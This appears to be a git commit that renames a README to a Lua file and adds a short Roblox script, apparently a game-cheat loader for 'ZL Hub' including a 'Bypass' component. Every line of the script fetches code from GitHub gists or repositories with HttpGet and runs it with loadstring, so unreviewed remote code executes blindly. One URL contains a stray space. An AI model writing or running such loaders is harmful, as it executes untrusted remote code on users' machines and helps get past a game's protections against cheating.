bb079debeb81cd1be1a92932cb81c2fa566e5b5c
RobaUnBrainrot <kskekekeejajajajaj@gmail.com>
2026-08-31 00:43:37 -0700

    Update and rename README.md to .lua

---
+++ .lua
@@ -0,0 +1,9 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/script-luasab/4d87adfc75ffb15fcbc509c18e3720f3/raw/ZLHUB.lua"))()
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xspeedHub0 /Zlhub/main/ZLPVPreview.lua"))()
+end)
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/Chocola-Bypass-Zl-Hub/refs/heads/main/script.lua"))()
+end)
